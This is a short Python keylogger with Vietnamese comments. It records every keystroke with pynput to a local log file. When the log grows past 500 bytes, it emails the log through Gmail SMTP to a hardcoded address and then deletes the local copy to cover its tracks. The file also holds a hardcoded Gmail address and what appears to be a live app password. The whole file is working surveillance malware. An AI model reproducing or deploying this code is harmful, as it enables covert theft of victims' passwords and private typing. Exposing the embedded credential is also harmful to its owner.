from pynput.keyboard import Listener
import logging
import smtplib
from email.message import EmailMessage
import os

# Cấu hình logging
log_file = "log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Gmail của bạn
EMAIL_ADDRESS = "dntai77@gmail.com"
EMAIL_PASSWORD = "lkef ndxk utnm mbci"  # Mật khẩu ứng dụng của Gmail

def send_email():
    with open(log_file, "r") as f:
        log_data = f.read()

    msg = EmailMessage()
    msg.set_content(log_data)
    msg["Subject"] = "Keylogger Report"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS  # Có thể gửi đến email khác

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        print("📩 Đã gửi log qua email!")
        os.remove(log_file)  # Xóa log sau khi gửi
    except Exception as e:
        print(f"Lỗi gửi email: {e}")

def on_press(key):
    logging.info(f"Phím nhấn: {key}")
    
    # Gửi email sau khi log có trên 50 ký tự
    if os.path.exists(log_file) and os.path.getsize(log_file) > 500:
        send_email()

with Listener(on_press=on_press) as listener:
    listener.join()